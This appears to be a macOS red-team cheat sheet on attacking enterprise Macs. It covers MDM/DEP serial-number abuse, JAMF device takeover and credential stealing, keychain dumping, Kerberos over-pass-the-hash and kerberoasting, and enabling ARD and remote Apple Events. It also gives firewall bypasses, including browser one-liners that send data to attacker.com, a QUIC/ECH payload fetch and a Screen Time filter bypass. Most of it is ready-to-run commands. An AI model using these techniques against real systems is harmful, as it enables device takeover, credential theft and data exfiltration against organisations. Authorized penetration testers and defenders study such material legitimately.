# Red Teaming, MDM & Enterprise Reference

## MDM / DEP Protocol

MDM uses APNs + RESTful API over HTTPS. Commands as plist-encoded dicts. Server needs Apple APNs certificate.

DEP automates zero-touch enrollment. Three APIs: reseller, MDM vendor "cloud service" (RESTful, JSON, OAuth), undocumented private device API via `cloudconfigurationd`. **DEP profile** contains: MDM vendor URL, optional pinning certs, Setup Assistant skip settings.

**SCEP**: standardized CSR for client cert provisioning. **Configuration Profiles** (`.mobileconfig`): XML plist, signed/encrypted, installed as root via `.pkg`.

### External Services

macOS often integrates with OneLogin, Okta, or Azure AD for SSO. Compromising macOS creds may grant access to GitHub, AWS, Slack, and other external services via stored OAuth/SAML tokens.

### Safari Auto-Open

Safari auto-decompresses "safe" downloads (zip, tar.gz). A downloaded zip is silently extracted -- useful for initial access payloads.

### Enrollment Flow

1. Device record created (Reseller/Apple) -> 2. Assigned to MDM server -> 3. MDM syncs, pushes DEP profiles to Apple -> 4. DEP check-in: device fetches Activation Record -> 5. Profile retrieval from MDM vendor URL -> 6. Profile installation (MDM, SCEP, root CA payloads) -> 7. Device listens for MDM commands via APNs push, polls `ServerURL`

### DEP Check-in (Step 4)

Triggered on first boot or `sudo profiles show -type enrollment`. Driven by `CPFetchActivationRecord` via `cloudconfigurationd` (LaunchDaemon, root). Uses **Absinthe** encryption:
1. GET `https://iprofiles.apple.com/resource/certificate.cer`
2. `NACInit` with device data (serial via IOKit)
3. POST `https://iprofiles.apple.com/session` for session key
4. POST `https://iprofiles.apple.com/macProfile` with `{"action":"RequestProfileConfiguration","sn":"<serial>"}` encrypted via `NACSign`

Response: `url` (MDM vendor host) + `anchor-certs` (DER trust anchors).

### Profile Payloads

- `com.apple.mdm` -- enrollment. Properties: `CheckInURL`, `ServerURL` + APNs topic, pinning cert UUIDs, `IdentityCertificateUUID`
- `com.apple.security.scep` -- client certificate
- `com.apple.security.pem` -- trusted CA into System Keychain

Installed by `mdmclient` over XPC. Plugin architecture (e.g., CertificateService.xpc).

### MDM as C2

MDM can: install/remove profiles, install apps, create local admins, set firmware password, change FileVault key.
- Get CSR signed via [mdmcert.download](https://mdmcert.download/), run [MicroMDM](https://github.com/micromdm/micromdm)
- Upon enrollment device trusts MDM SSL cert as CA -- sign anything
- Install `.mobileconfig` as root via `.pkg`. **Mythic agent Orthrus** uses this.

### DEP Serial Number Abuse

Only an org serial number needed to enroll. Enrolled devices receive certs, apps, WiFi passwords, VPN configs.
- Disable SIP, attach LLDB to `cloudconfigurationd`, inject arbitrary serial before Absinthe encryption
- Retrieve full DEP profiles for arbitrary serials; automatable with Python + LLDB API
- `MCCloudConfigAcceptAnyHTTPSCertificate` bypasses cert validation but payload stays encrypted

---

## JAMF Exploitation

Check MDM: `jamf checkJSSConnection`

**Self-Enrollment**: Visit `https://<company>.jamfcloud.com/enroll/`. Use [JamfSniper.py](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) for password spraying.

**Device Authentication**: `jamf` binary shared keychain secret: **`jk23ucnq91jfu9aj`**. Persists as LaunchDaemon: `/Library/LaunchAgents/com.jamf.management.agent.plist`

**Device Takeover**: JSS URL in `/Library/Preferences/com.jamfsoftware.jamf.plist`:
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist
# <key>jss_url</key> <string>https://subdomain.jamfcloud.com/</string>
```
Overwrite via malicious `.pkg` pointing at Mythic C2 (Typhon agent). Reload: `sudo jamf policy -id 0`

**Impersonation**: Need device UUID (`ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`) + JAMF keychain (`/Library/Application Support/Jamf/JAMF.keychain`). Create VM with stolen UUID, SIP disabled, drop keychain, hook agent.

**Credential Stealing**: Monitor `/Library/Application Support/Jamf/tmp/` for admin scripts (placed, executed, removed). Watch process args: `ps aux | grep -i jamf`. [JamfExplorer.py](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) automates file/process monitoring.

---

## Keychain Attacks

### Architecture

- **User Keychain**: `~/Library/Keychains/login.keychain-db` -- app/internet passwords, user certs/keys
- **System Keychain**: `/Library/Keychains/System.keychain` -- WiFi passwords, system certs/keys
- Additional: `/System/Library/Keychains/*`
- Downloadable but encrypted; requires user plaintext password. Offline: [Chainbreaker](https://github.com/n0fate/chainbreaker).

### ACL Model

ACL types: `ACLAuthorizationExportClear` (cleartext), `ACLAuthorizationExportWrapped` (encrypted export), `ACLAuthorizationAny`. Trusted app list: `Nil` (all trusted), empty (none), or specific apps.

**`ACLAuthorizationPartitionID`**: `teamid` (same Team ID), `apple` (Apple-signed), `cdhash` (exact hash).

Entry via Keychain Access.app: partitionID=`apple`, no export without prompt. Entry via app API: partitionID=`teamid:[ID]`, only creator can export silently.

### Silent Export Conditions

With trusted apps: need authorization + PartitionID match + trusted app signature match. With all apps trusted: need authorization + PartitionID match (if set). With 1 app listed: **inject code into that app**. If `apple` partitionID: use `osascript` or `Python`.

### security CLI
```bash
security list-keychains
security dump-keychain -a -d                    # dump all (pop-ups)
security find-generic-password -a "Slack" -g    # find + print secret
security dump-keychain ~/Library/Keychains/login.keychain-db
```

### API Access

`SecItemCopyMatching` -- `kSecReturnData` (decrypt, may pop-up), `kSecReturnRef` (reference for later), `kSecReturnAttributes` (metadata), `kSecMatchLimit`, `kSecClass`. `SecAccessCopyACLList` returns ACLs. `SecKeychainItemCopyContent` gets plaintext. `SecItemExport` exports keys/certs.

[LockSmith](https://github.com/its-a-feature/LockSmith): enumerate and dump secrets without prompts.

**Hidden attributes**: `Invisible` (hides from UI), `General` (plaintext metadata -- Microsoft stored refresh tokens here).

---

## Active Directory from macOS

### Enumeration
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
dscl . ls /Users && dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"
dscl . ls /Groups && dscl . read "/Groups/[groupname]"
dscacheutil -q user
dsconfigad -show
```

User types: Local (OpenDirectory), Network (volatile, needs DC), Mobile (AD + local backup). Data: `/var/db/dslocal/nodes/Default/`.

### Tools

- [Machound](https://github.com/XMCyber/MacHound): Bloodhound extension for macOS AD. Adds edges: **CanSSH**, **CanVNC**, **CanAE**.
- [Bifrost](https://github.com/its-a-feature/bifrost): Objective-C, native Heimdal krb5 APIs.
- [Orchard](https://github.com/its-a-feature/Orchard): JXA for AD enumeration.

### Kerberos Attacks
```bash
bifrost --action askhash --username [name] --password [pass] --domain [domain]
# Over-Pass-The-Hash
bifrost --action asktgt --username test_lab_admin \
  --hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
  --enctype aes256 --domain test.lab.local
# Kerberoasting
bifrost --action asktgs --spn [service] --domain [domain.com] \
  --username [user] --hash [hash] --enctype [enctype]
# Access shares
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
Computer$ password accessible from System keychain.

---

## Network Services & Lateral Movement

| Service | Port | macOS Name |
|---------|------|------------|
| VNC | tcp/5900 | Screen Sharing |
| SSH | tcp/22 | Remote Login |
| ARD | tcp/3283, 5900 | Remote Management |
| EPPC | tcp/3031 | Remote Apple Events |

### Detection & Config
```bash
system_profiler SPSharingDataType
sudo /usr/sbin/systemsetup -getremotelogin
sudo /usr/sbin/systemsetup -getremoteappleevents
sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -status
```

### ARD Pentesting

Auth uses only first 8 chars of password -- brute-force with Hydra/[GoRedShell](https://github.com/ahhh/GoRedShell). No rate limits. Detect: nmap `vnc-info`; `VNC Authentication (2)` = vulnerable.
```bash
sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart \
  -activate -configure -allowAccessFor -allUsers -privs -all -clientopts -setmenuextra -menuextra yes
```
Monterey 12.1+: use MDM `EnableRemoteDesktop` command.

### Remote Apple Events (EPPC)

tcp/3031, `com.apple.AEServer`. Valid creds + enabled RAE = remote AppleScript on any scriptable app.
```bash
sudo /usr/sbin/systemsetup -getremoteappleevents        # check
sudo /usr/sbin/systemsetup -setremoteappleevents on      # enable
osascript -e 'tell application "Finder" of machine "eppc://user:pass@192.0.2.10" to get name of startup disk'
```

### Bonjour Discovery
```bash
dns-sd -B _rfb._tcp local       # VNC
dns-sd -B _ssh._tcp local       # SSH
dns-sd -B _eppc._tcp local      # EPPC
dns-sd -L "<Instance>" _rfb._tcp local
```

---

## Firewall Bypass

**Whitelisted app name abuse**: name malware after trusted processes (e.g., `launchd`).
**Synthetic clicks**: malware programmatically clicks "Allow" on firewall prompts.
**Apple-signed binary abuse**: `curl`, `whois`, `mdnsresponder` for DNS/HTTP exfil.
**Apple domain abuse**: firewalls whitelist `apple.com`, `icloud.com` -- use iCloud as C2.

### Browser-Based Exfil
```bash
osascript -e 'tell application "Safari" to make new document with properties {URL:"https://attacker.com?d=exfil"}'
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?d=exfil"
firefox-bin --headless "https://attacker.com?d=exfil"
open -j -a Safari "https://attacker.com?d=exfil"
```

**Process injection**: inject into any allowed-outbound process to bypass firewall entirely.

**Check allowed traffic**: `lsof -i TCP -sTCP:ESTABLISHED`

### ContentFilterExclusionList (pre-macOS 11.2)
~50 Apple binaries (`nsurlsessiond`, App Store) bypassed Network Extension firewalls. Spawn/inject into excluded process. Removed in 11.2.

### QUIC/ECH Evasion (macOS 12+)
NEFilter keys off TLS SNI. QUIC + Encrypted Client Hello hides SNI; hostname rules fail-open:
```bash
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
  --enable-quic --origin-to-force-quic-on=attacker.com:443 \
  --enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
  https://attacker.com/payload
```

### macOS 15 Sequoia NE Instability
Early 15.0/15.1 crashes third-party NE filters. On restart, flow rules drop -- fail-open window. Flood UDP flows to trigger.

**PF inspection**: `sudo pfctl -a com.apple/250.ApplicationFirewall -sr`

### CVE-2024-44206 Screen Time Web Content Filter Bypass
Double URL-encoded URIs bypass Screen Time ACL but are accepted by WebKit. Any process opening a URL reaches explicitly blocked domains:
```bash
open "http://attacker%2Ecom%2F./"   # bypasses Screen Time on unpatched systems
```

### Network Entitlement Check
Find binaries already allowed outbound (useful for piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
    | plutil -extract com.apple.security.network.client xml1 -o - -
```

---

## Serial Number Format

Post-2010 Apple: **12 alphanumeric characters**. Example: **C02L13ECF8J2**

| Position | Meaning |
|----------|---------|
| 1-3 | Manufacturing location |
| 4 | Year (half-year period, C=1H2010 through Z=2H2019) |
| 5 | Week (1-9 direct; C-Y excl. vowels/S = weeks 10-27; +26 for 2H) |
| 6-8 | Unique device identifier |
| 9-12 | Model number |

**Locations**: FC/F/XA/XB/QP/G8=USA; RN=Mexico; CK=Cork, Ireland; VM=Foxconn, Czech Republic; SG/E=Singapore; MB=Malaysia; PT/CY=Korea; EE/QT/UV=Taiwan; FK/F1/F2/W8/DL/DM/DN/YM/7J/1C/4H/WQ/F7=China (various); C0/C3/C7=specific Chinese cities; RM=Refurbished.

Useful for DEP abuse: knowing valid serial prefixes for a target org's hardware narrows brute-force of the enrollment API.
